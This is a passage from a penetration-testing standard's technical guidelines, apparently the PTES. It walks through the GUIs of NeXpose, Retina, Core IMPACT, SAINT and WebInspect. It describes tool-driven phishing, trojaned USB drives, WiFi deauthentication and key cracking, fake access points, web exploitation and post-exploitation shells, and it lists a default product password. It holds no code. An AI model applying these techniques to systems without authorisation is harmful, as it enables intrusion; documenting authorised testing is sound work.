You can click the box again at any time to disable the alert if you prefer not to receive that alert temporarily without having to delete it. [[:File:Penetration_Testing_Execution_83.png|Screenshot Here]] Type a name for the alert and a value in the 'Send at most' field if you wish to limit the number of this type of alert that you receive during the scan. Select the check boxes for types of events (Started, Stopped, Failed, Paused, and Resumed) that you wish to generate alerts for. Select the Confirmed, Unconfirmed, and/or Potential check boxes to receive only those alerts. Select a notification method from the dropdown box. NeXpose can send alerts via SMTP e-mail, SNMP message, or Syslog message. Select e-mail method and enter the addresses of your intended recipients. Click the Limit alert text check box to send the alert without a description of the alert or its solution. Click the Save button. The new alert appears on the 'Alerting' page. [[:File:Penetration_Testing_Execution_84.png|Screenshot Here]] Establishing logon credentials enables deeper checks across a wider range of vulnerabilities, such as policy violations, adware, or spyware. Additionally, credentialed scans result in more accurate results. On the 'Credentials' page click 'New Login' display the 'New Login' box. [[:File:Penetration_Testing_Execution_85.png|Screenshot Here]] Select the desired type of credentials from the dropdown list labeled 'Login type'. This selection determines the other fields that appear in the form. In the appropriate field enter the appropriate user name and/or password. The 'Restrict to Device' and 'Restrict to Port' fields allows for testing credentials to ensure that the work on a given site. After filling those fields, click on the 'Test login' button to make sure that the credentials work. Specifying a port in the Restrict to Port field allows you to limit your range of scanned ports in certain situations. Click the 'Save' button. The new credentials appear on the 'Credentials' page. Once the scan has completed, you can view the results in several manners. It is possible to view the assets by sites, view assets by groups, view assets by operating systems, view assets by services, view assets by software, and view all assets. [[:File:Penetration_Testing_Execution_86.png|Screenshot Here]] By selecting the appropriate assets view you can select the results that you wish to view. [[:File:Penetration_Testing_Execution_87.png|Screenshot Here]] To create a report, click on the 'Create Site Report' button. This will take you to the 'New Report' 'Configuration' page. [[:File:Penetration_Testing_Execution_88.png|Screenshot Here]] Report configuration entails selecting a report template, assets to report on, and distribution options. You may schedule automatic reports for generation and distribution after scans or on a fixed calendar timetable; or you may run reports manually. After you go through all the following configuration steps and click 'Save', NeXpose will immediately start generating a report.","title":"NeXpose"},{"location":"pentest_standard/tecguidelines/#eeye-retina","text":"eEye Retina Vulnerability Assessment Scanner is a vulnerability scanner created by eEye Digital Security that is used to correlate and validate findings from Nmap and Nessus. At first glance, the interface looks to be much more complicated than Nessus. It is however, extremely simple once you've explored it. The initial screen that is presented is the Discovery Tasks page. This is utilized to perform a discovery scan to determine what hosts are alive. ''' [[:File:Penetration_Testing_Execution_89.png|Screenshot Here]] ''' To perform a Discovery Scan, click Targets from the Actions section and the \"Select Targets\" option will appear. At this point you can either enter in a single IP address or hostname that you assess. The other options available are to scan by IP Range, CIDR, Named Host, and Address Groups. Clicking on the Options Actions section presents us with additional options related to the Discovery scan. These options include ICMP Discovery, TCP Discovery on Ports (enter in a comma separated list of port numbers, UPD Discovery, Perform OS Detection, Get Reverse DNS, Get NetBIOS Name, and Get MAC Address. Select the appropriate options for the scan desired. ''' [[:File:Penetration_Testing_Execution_90.png|Screenshot Here]] ''' To run the Discovery scan immediately click \"Discover.\" To run the Discovery scan at a later point in time or on a regular schedule, click \"Schedule.\" Retina displays your results in the Results table as it scans the selected IP(s). In order to get the results in a format that we can use, we need to select the scan results and click \"Generate\" to export the results in XML format. ''' [[:File:Penetration_Testing_Execution_91.png|Screenshot Here]] ''' While Discovery Scans may be useful, the majority of our tasks will take place in the Audit Interface. This is very similar to the Discovery Scan interface; however it does have a few more options. ''' [[:File:Penetration_Testing_Execution_92.png|Screenshot Here]] ''' The Targets section is similar though there is an additional section that allows us to specify the Output Type, Name, and Job Name. ''' [[:File:Penetration_Testing_Execution_93.png|Screenshot Here]] ''' This section is important to complete, as this is how the scan results will be saved. If you do not change this information then you could potentially overwrite someone else's scan results. By default, these are saved to the following directory: C:\\Program Files\\eEye Digital Security\\Retina 5\\Scans This is important to note, as you will need to copy these from this location to your working directory. At this point we need to click Ports from the Actions section and the \"Select Port Group(s)\" option will appear. At this point we need to validate that the \"All Ports\" option has been selected. ''' [[:File:Penetration_Testing_Execution_94.png|Screenshot Here]] ''' The next section we need to check is \"Audits\" from the Actions section and the \"Select Audit Group(s)\" option will appear. At this point we need to validate that the \"All Audits\" option has been selected. ''' [[:File:Penetration_Testing_Execution_95.png|Screenshot Here]] ''' The final section we need to check is \"Options\" from the actions section. Clicking on this will present us with the \"Select Options\" action section. ''' [[:File:Penetration_Testing_Execution_96.png|Screenshot Here]] ''' At this point we need to validate that the following option has been selected: Perform OS Detection Get Reverse DNS Get NetBIOS Name Get MAC Address Perform Traceroute Enable Connect Scan Enable Force Scan Randomize Target List Enumerate Registry via NetBIOS Enumerate Users via NetBIOS Enumerate Shares via NetBIOS Enumerate Files via NetBIOS Enumerate Hotfixes via NetBIOS. Enumerate Named Pipes via NetBIOS Enumerate Machine Information via NetBIOS Enumerate Audit Policy via NetBIOS Enumerate Per-User Registry Settings via NetBIOS Enumerate Groups via NetBIOS Enumerate Processes via NetBIOS Enumerate a maximum of 100 users At this point we are ready to actually perform the Audit Scan. Click the Scan button to start the Audit Scan immediately. To perform the scan at a later point in time or on a regular schedule, click \"Schedule.\" ''' [[:File:Penetration_Testing_Execution_97.png|Screenshot Here]] ''' ''Note:'' Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected. The results of your scan are automatically saved in .rtd format. Retina displays your results in the Results table as it scans the selected IP(s). ''' [[:File:Penetration_Testing_Execution_98.png|Screenshot Here]] '''","title":"eEYE Retina"},{"location":"pentest_standard/tecguidelines/#qualys","text":"< Contribution Needed >","title":"Qualys"},{"location":"pentest_standard/tecguidelines/#core-impact","text":"Core IMPACT is a penetration testing and exploitation toolset used for testing the effectiveness of your information security program. Core IMPACT automates several difficult exploits and has a multitude of exploits and post exploitation capabilities.","title":"Core IMPACT"},{"location":"pentest_standard/tecguidelines/#core-impact-web","text":"Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. ''' [[:File:coreWEBrpt.jpg|Screenshot Here]] ''' 1) Information Gathering. As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive. With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters. ''' [[:File:coreWEBcrawl.jpg|Screenshot Here]] ''' With interactive, you set your \u00eebrowser\u00ee to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. ''' [[:File:corerptmodules.jpg|Screenshot Here]] ''' 2) Web Attack and penetration. The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard. SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don\u00edt. Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View. 3) Web Apps Browser attack. Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. 4) Web App Local Information Gathering. Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. ''' [[:File:coreWEBagendeployed.jpg|Screenshot Here]] ''' The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. 5) Report Generation. Select from a variety of reports like executive, vulnerability and activity reports. Core Onestep Web RPTs Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans.","title":"Core IMPACT Web"},{"location":"pentest_standard/tecguidelines/#core-impact-wifi","text":"Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com . ''' [[:File:corewireless.jpg|Screenshot Here]] ''' 1) Information Gathering. Select the channels to scan to discover access points or capture wireless packets. 2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking. 3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognizance phase should be used. 4) Man in the Middle client attacks. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack. 5) Reporting. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated.","title":"Core IMPACT WiFi"},{"location":"pentest_standard/tecguidelines/#core-impact-client-side","text":"Core Impact can perform controlled and targeted social engineering attacks against a specified user community via email, web browsers, third-party plug-ins, and other client-side applications. ''' [[:File:coreCSrpt.jpg|Screenshot Here]] ''' 1) As always, the first step information gathering. Core Impact has automate modules for scraping email addresses our of search engines (can utilize search API keys), PGP, DNS and WHOIS records, LinkedIn as well as by crawling a website, contents and metadata for Microsoft Office Documents and PDFs , or importing from a text file generated using source as documented in the intelligence gather section of the PTES. 2) With the target list complete, the next step is to create the attack. Core supports multiple types of attacks, including single exploit, multiple exploits or a phishing only attack ''' [[:File:coreCSattacktype.jpg|Screenshot Here]] ''' ''' [[:File:coreCSsingle.jpg|Screenshot Here]] ''' ''' [[:File:coreCSmulti.jpg|Screenshot Here]] ''' ''' [[:File:coreCSphish.jpg|Screenshot Here]] ''' Depending on which option is chosen the wizard will walk you through choosing the exploit, setting the duration of the client side test, and choosing an email template (note: predefined templates are available, but message should be customized to match target environment!) .Web links can be obfuscated using tinyURL, Bit.Ly or Is.gd. After setting the options for the email server the Core Agent connect back method (HTTP, HTTPS, or other port), and choosing whether or not to run a module on successful exploitation or to try to collect smb credentials, the attack will start. Specific modules can be run instead of using the wizard by choosing the modules tab ''' [[:File:corerptormodules.jpg|Screenshot Here]] ''' Monitor the Executed Modules pane to see the progress of the client side attack. As agents are deployed, they will be added to the network tab. See the network RPT section of the PTES for details on completing the local information gathering, privilege escalation and clean up tasks. Once the client side attack is complete, detailed reporting of the client side phishing/exploitation engagement can be generated. It is also possible to create a trojaned USB drive that will automatically install the Core agent. ''' [[:File:coreCSusb.jpg|Screenshot Here]] '''","title":"Core IMPACT Client Side"},{"location":"pentest_standard/tecguidelines/#core-web","text":"Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. ''' [[:File:coreWEBrpt.jpg|Screenshot Here]] ''' 1) Information Gathering. As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive. With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters.","title":"Core Web"},{"location":"pentest_standard/tecguidelines/#corewebcrawl","text":"With interactive, you set your \u201dbrowser\u201d to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. ''' [[:File:corerptmodules.jpg|Screenshot Here]] ''' 2) Web Attack and penetration. The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard. SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don\u2019t. Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View. 3) Web Apps Browser attack. Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. 4) Web App Local Information Gathering. Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. ''' [[:File:coreWEBagendeployed.jpg|Screenshot Here]] ''' The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. 5) Report Generation. Select from a variety of reports like executive, vulnerability and activity reports.","title":"coreWEBcrawl"},{"location":"pentest_standard/tecguidelines/#core-onestep-web-rpts","text":"Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans.","title":"Core Onestep Web RPTs"},{"location":"pentest_standard/tecguidelines/#core-wifi","text":"Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com . 1) Information Gathering. Select the channels to scan to discover access points or capture wireless packets. 2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking. 3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognisance phase should be used. 4) Man in the Middle client attacks. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack. 5) Reporting. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated.","title":"Core WiFi"},{"location":"pentest_standard/tecguidelines/#saint","text":"SAINT Professional is a commercial suite combining two distinct tools rolled into one easy to use management interface; SAINTscanner and SAINTexploit providing a fully integrated vulnerability assessment and penetration testing toolkit. SAINTscanner is designed to identify vulnerabilities on network devices, OS and within applications. It can be used for compliance and audit testing based on pre-defined and custom policies. In addition as a data leakage prevention tool it can enumerate any data that should not be stored on the network. SAINTexploit is designed to exploit those vulnerabilities identified by SAINTscanner, with the ability to carry out bespoke social engineering and phishing attacks also. One a host or device has been exploited it can be utilised to tunnel through to other vulnerable hosts. SAINT can either be built from source or be run from a pre-configured virtual machine supplied by the vendor. If the latter is used (recommended) simply double clicking the icon will launch the suite. By default the password is \u201cSAINT!!!\u201d The default web browser opens after SAINT auto updates to the following URL: http:// :52996/ Screenshot Here SAINT_startup.png refers (included).","title":"SAINT"},{"location":"pentest_standard/tecguidelines/#saintscanner","text":"Once logged in you immediately enter the SAINTscanner page with the Penetration Testing (SAINTXploit) tab easily available and visible. It is possible to login remotely to SAINT, by default this is over port 1414 and has those hosts allowed to connect have to be setup via Options, startup options, Category remote mode, subcategory host options: Screenshot Here SAINT_Remote_host.png refers (included). Configuration of scanning options should now be performed which is accessed by Options, scanning options, Category scanning policy. Each sub category needs to be addressed to ensure that the correct default scanning parameters are set i.e. using nmap rather than the in-built SAINT port scanner and which ports to probe, that dangerous checks are disabled (if required) and that the required items for compliance and audit are enabled for reporting i.e. anti-virus, age of definition check etc. Screenshot Here SAINT_scanning_options.png refers (included). Note: - The target restrictions sub-category should be amended if any hosts are not to be probed. The most import scanning option is Category Scanning policy, sub-category probe options, option, what scanning policy should be used, the scan required is selected or a custom policy built-up to suit the actual task Screenshot here SAINT_policy_setup.png refers (included). Having configured all the options required the actual process of carrying out a scan can be addressed. Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials Screenshot here SAINT_scansetup1.png refers (included). Step 3 Select Scan Policy Type Step 4 Determine Firewall settings for Target Step 5 Select Scan Now Screenshot here SAINT_scansetup2.png refers (included).","title":"SAINTscanner"},{"location":"pentest_standard/tecguidelines/#saintexploit","text":"Different levels of penetration tests can be carried out: Discovery - Identify hosts. Information Gathering - Identify hosts, probe and port scan. Single Penetration - Both above then exploits stopping at first successful exploit. Root Penetration - Exploit then Privilege escalation to admin/ root. Full Penetration - Exploits as many vulnerabilities as possible. Web Application - Attacks discovered web applications. Conducting a test is fairly straight forward, once any prior configuration has been carried out, callback ports, timeouts etc. Just select the Pen Test icon then go through the following 4 steps. Once complete select run pen test now. Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials Screenshot here SAINT_pen1.png refers (included). Step 3 Select Penetration Test Type Step 4 Determine Firewall settings for Target SAINT_pen2.png Screenshot here SAINT_pen2.png refers (included). Once a host has been successfully exploited, navigating to the connections tab provides the ability to directly interact with the session. SAINTexploit provides four useful tools in this tab to allow interactive access to the session and a disconnect button to close any outstanding connection: Command Prompt. File and Upload Manager. Screenshot Taker Tunnel. Screenshot here SAINT_connections.png refers (included) The File Manager gives the ability to perform numerous actions. This is opened via the connections tab, providing the ability to upload/ download/ rename files. Screenshot here SAINT_filemgr.png refers (included) A Command Prompt can be utilised on an exploited host, the tool is opened via the connections tab, all DOS/Bash type commands that are applicable to the target OS can be ran. Screenshot here SAINT_cmd.png refers (included) The Screenshot Tool can be used against an exploited host to grab a screenshot for the report. Screenshot here SAINT_screen.png refers (included) Varied other tools that can be utilised against the host, i.e. grabbing password hashes and many others can be accessed and executed via the exploits icon, tools option. Custom Client Side attacks These can be performed by using the exploits icon, selecting exploits, expanding out the client list and clicking on the appropriate exploit that you wish to utilise against the client (run now) Screenshot here SAINT_client1.png refers (included) Select, port the client is to connect to, the shell port and the target type. Annotate any specific mail from and to parameters Screenshot here SAINT_client2.png refers (included) Type in the subject, either select a predefined template and alter the message to suit Screenshot here SAINT_client3.png refers (included) A sample pre-defined template is available which looks very realistic Screenshot here SAINT_client4.png refers (included) Selecting run now will start the exploit server against the specified target host Screenshot here SAINT_client5.png refers (included) If a client click the link in the email they have just been sent, and they are exploitable, the host will appear in the connections tab and can then be interacted with as above.","title":"SAINTexploit"},{"location":"pentest_standard/tecguidelines/#saintwriter","text":"SAINTwriter is a component of SAINT that allows you to generate a variety of customised reports. SAINTwriter features eight pre-configured reports, eight report formats (HTML, Frameless HTML, Simple HTML, PDF, XML, text, tab-separated text, and comma-separated text), and over 100 configuration options for custom reports. To generate a report Step 1 From the SAINT GUI, go to Data, and from there go to SAINTwriter. Step 2 Read the descriptions of the pre-configured reports and select the one which best suits your needs. Screenshot here SAINT_writer.png refers (included). A sample report is available here and here SAINT_report1.pdf and SAINT_report2.pdf refer (included)","title":"SAINTwriter"},{"location":"pentest_standard/tecguidelines/#web-application-scanners","text":"","title":"Web Application Scanners"},{"location":"pentest_standard/tecguidelines/#general-web-application-scanners","text":"","title":"General Web Application Scanners"},{"location":"pentest_standard/tecguidelines/#webinspect-windows","text":"HP's WebInspect application security assessment tool helps identify known and unknown vulnerabilities within the Web application layer. WebInspect can also help check that a Web server is configured properly, and attempts common web attacks such as parameter injection, cross-site scripting, directory traversal, and more When you first start WebInspect, the application displays the Start Page. For this page we can perform the five major functions within the WebInpsect GUI. The options are to start a Web Site Assessment, start a Web Service Assessment, start an Enterprise Assessment, generate a Report, and start Smart Update. From the Start Page, you can also access recently opened scans, view the scans that are scheduled for today and finally, view the WebInspect Messages. ''' [[:File:Penetration_Testing_Execution_99.png|Screenshot Here]] ''' The first scan that is performed with WebInspect is the Web Site Assessment Scan. WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans. ''' [[:File:Penetration_Testing_Execution_100.png|Screenshot Here]] ''' When you start the New Scan wizard, the Scan Wizard window appears. The options displayed within the wizard windows are extracted from the WebInspect default settings. The important thing to note is that any changes you make will be used for this scan only. In the Scan Name box, enter a name or a brief description of the scan. Next you need to select one an assessment mode. The options available are Crawl Only, Crawl and Audit, Audit Only, and Manual. The \"Crawl Only\" option completely maps a site's tree structure. It is possible after a crawl has been completed, to click \"Audit\" to assess an application's vulnerabilities. \"Crawl and Audit\" maps the site's hierarchical data structure, and audits each page as it is discovered. This should be used when assessing extremely large sites. \"Audit Only\" determines vulnerabilities, but does not crawl the web site. The site is not assessed when this option is chosen. Finally, \"Manual\" mode allows you to navigate manually to sections of the application. It does not crawl the entire site, but records information only about those file_suport that you encounter while scanning a Site manually navigating the site. Use this option if there are credentialed scans being performed. Also, ensure that you embed the credentials in the profile settings. ''' [[:File:Penetration_Testing_Execution_101.png|Screenshot Here]] ''' It is recommended to crawl the client site first. This allows the opportunity to identify any forms that need to be filtered during the audit as well as identify directories/file names (in some cases, even the profiler) that need to be ignored for a scan to complete. Once you have selected the assessment mode, you will need to select the assessment type. There are four options available, Standard Assessment, List-Driven Assessment, Manual Assessment, and Workflow-Driven Assessment. The Standard Assessment type consists of automated analysis, starting from the target URL. This is the normal way to start a scan. Manual Assessment allows you to navigate manually to whatever sections of your application you choose to visit, using Internet Explorer. List-Driven Assessment performs an assessment using a list of URLs to be scanned. Each URL must be fully qualified and must include the protocol (for example, http:// or https://). Workflow-Driven Assessment: WebInspect audits only those URLs included in the macro that you previously recorded and does not follow any hyperlinks encountered during the audit. As discussed earlier, Standard Assessment will normally be used for the initial scans. If this is the choice you've selected you will need to type or select the complete URL or IP address of the client's site to be examined. When you enter a URL, it must be precise. For example, if you entering client.com will not result in a scan of www.client.com or any other variations. To scan from a specific point append a starting point for the scan, such as http://www.client.com/clientapplication/ . By default, scans performed by IP address will not follow links that use fully qualified URLs. ''' [[:File:Penetration_Testing_Execution_102.png|Screenshot Here]] ''' Select \"Restrict to folder\" to limit the scope of the assessment to the area selected. There are three options available from the drop-down list. ''' [[:File:Penetration_Testing_Execution_103.png|Screenshot Here]] ''' The choices are Directory only, Directory and subdirectories, and Directory and parent directories. Choosing the \"Directory only\" option will force a crawl and/or audit only for the URL specified. The \"Directory and subdirectories\" options will crawl and/or audit at the URL specified as well as subordinate directories. It will not access any directory than the URL specified. The \"Directory and parent directories\" option will crawl and/or audit the URL you specified, but will not access any subordinate directories. Once you have selected to appropriate options, click Next to continue. If the target site needs to accessed through a proxy server, select Network Proxy and then choose an option from the Proxy Profile list. The default is to Use Internet Explorer. The other options available are Autodetect, Use PAC File, Use Explicit Proxy Settings, and Use Mozilla Firefox. Autodetect uses the Web Proxy Autodiscovery Protocol (WPAD) to locate a proxy autoconfig file and use this to configure the browser's Web proxy settings. Use PAC File loads proxy settings from a Proxy Automatic Configuration (PAC) file. Use Explicit Proxy Settings allows you to specify proxy server settings. Use Mozilla Firefox imports the proxy server information from Firefox. ''' [[:File:Penetration_Testing_Execution_104.png|Screenshot Here]] ''' Selecting to use browser proxy settings does not guarantee that you will be able to access the Internet through a particular proxy server. If the Internet Explorer settings are configured to use a proxy that is not running, then you will not be able to access the site to begin the assessment. For this reason, it is always recommended to check the prosy settings of the application you have selected. Select Network Authentication if server authentication is required. Then choose the specific authentication method and enter your network credentials. Click Next to continue. The Coverage and Thoroughness options are not usually modified, unless you are targeting an Oracle site. [[:File:Penetration_Testing_Execution_105.png|Screenshot Here]] To optimize settings for an Oracle site, select Framework and then choose the site type from the Optimize scan for list. Use the Crawl slider to specify the crawler settings. If enabled, the slider allows you to select one of four crawl positions. The options are Thorough, Default, Normal, and Quick. The specific settings are as follows: Thorough uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 20 Maximum Web Form Submissions: 7 Create Script Event Sessions: ON Maximum Script Events Per Page: 2000 Number of Dynamic Forms Allowed Per Session: Unlimited Include Parameters In Hit Count: True Default uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 5 Maximum Web Form Submissions: 3 Create Script Event Sessions: ON Maximum Script Events Per Page: 1000 Number of Dynamic Forms Allowed Per Session: Unlimited Include Parameters In Hit Count: True Normal uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 5 Maximum Web Form Submissions: 2 Create Script Event Sessions: ON Maximum Script Events Per Page: 300 Number of Dynamic Forms Allowed Per Session: 1 Include Parameters In Hit Count: False Quick uses the following settings: Redundant Page Detection: ON Maximum Single URL Hits: 3 Maximum Web Form Submissions: 1 Create Script Event Sessions: OFF Maximum Script Events Per Page: 100 Number of Dynamic Forms Allowed Per Session: 0 Include Parameters In Hit Count: False Select the appropriate crawl position and click Next to continue. ''' [[:File:Penetration_Testing_Execution_106.png|Screenshot Here]] ''' Ensure that the select Run Profiler Automatically box is checked. Click Next to continue. ''' [[:File:Penetration_Testing_Execution_107.png|Screenshot Here]] ''' At this point the scan has been properly configured. There is an option to save the scan settings for later use. Click Scan to exit the wizard and begin the scan. As soon as you start a Web Site Assessment, WebInspect displays in the Navigation pane an icon depicting each session. It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane. If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane. The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon. [[:File:Penetration_Testing_Execution_108.png|Screenshot Here]] When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window. It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented. When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area. Select the type of information to display by clicking on an item in one of three information panels in the left column. The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information. The Vulnerabilities Tab lists all vulnerabilities discovered during an audit. The Information Tab lists information discovered during an assessment or crawl. These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers. The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development. Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof). The Scan Log Tab is used to view information about the assessment. For instance, the time at which certain auditing was conducted against the target. Finally, the Server Information Tab lists items of interest pertaining to the server. ''' [[:File:Penetration_Testing_Execution_109.png|Screenshot Here]] ''' The final step is to export the results further analysis. To export the results of the analysis to an XML file, click File, then Export. This presents the option to export the Scan or Scan Details. ''' [[:File:Penetration_Testing_Execution_110.png|Screenshot Here]] ''' From the Export Scan Details window we need to choose the Full from the Details option. This will ensure that we obtain the most comprehensive report possible. Since this is only available in XML format, the only option we have left to choose is to scrub data. If you want to ensure that SSN, and Credit Card data is scrubbed then select these options. If you choose to scrub IP address information then the exported data will be useless for our purposes. Click Export to continue. Choose the file location to save the exported data. '''Web Service Assessment Scan''' The first scan that is performed with WebInspect is the Web Site Assessment Scan. WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans. ''' [[:File:Penetration_Testing_Execution_111.png|Screenshot Here]] ''' When you start the New wizard, the Web Service Scan Wizard window appears. The options displayed within the wizard windows are extracted from the WebInspect default settings. The important thing to note is that any changes you make will be used for this scan only. In the Scan Name box, enter a name or a brief description of the scan. Next you need to select one an assessment mode. The options available are Crawl Only, and Crawl and Audit. The \"Crawl Only\" option completely maps a site's tree structure. It is possible after a crawl has been completed, to click \"Audit\" to assess an application's vulnerabilities. \"Crawl and Audit\" maps the site's hierarchical data structure, and audits each page as it is discovered. ''' [[:File:Penetration_Testing_Execution_112.png|Screenshot Here]] ''' Once you have selected the assessment mode, you will need to select the location of the WSDL file. WSDL is an XML format for describing network services as a set of endpoints operating on messages containing either document-oriented or procedure-oriented information. Once you have selected to appropriate options, click Next to continue. ''' [[:File:Penetration_Testing_Execution_113.png|Screenshot Here]] ''' At this point the scan has been properly configured. There is an option to save the scan settings for later use. Click Scan to exit the wizard and begin the scan. As soon as you start a Web Service Assessment, WebInspect displays in the Navigation pane an icon depicting each session. It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane. If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane. The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon. ''' [[:File:Penetration_Testing_Execution_114.png|Screenshot Here]] ''' When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window. It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented. When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area. Select the type of information to display by clicking on an item in one of three information panels in the left column. The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information. The Vulnerabilities Tab lists all vulnerabilities discovered during an audit. The Information Tab lists information discovered during an assessment or crawl. These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers. The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development. Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof). The Scan Log Tab is used to view information about the assessment. For instance, the time at which certain auditing was conducted against the target. Finally, the Server Information Tab lists items of interest pertaining to the server. ''' [[:File:Penetration_Testing_Execution_115.png|Screenshot Here]] ''' The final step is to export the results for further analysis. To export the results of the analysis to an XML file, click File, then Export. This presents the option to export the Scan or Scan Details. ''' [[:File:Penetration_Testing_Execution_116.png|Screenshot Here]] ''' From the Export Scan Details window we need to choose the Full from the Details option. This will ensure that we obtain the most comprehensive report possible. Since this is only available in XML format, the only option we have left to choose is to scrub data. If you want to ensure that SSN, and Credit Card data is scrubbed then select these options. If you choose to scrub IP address information then the exported data will be useless for our 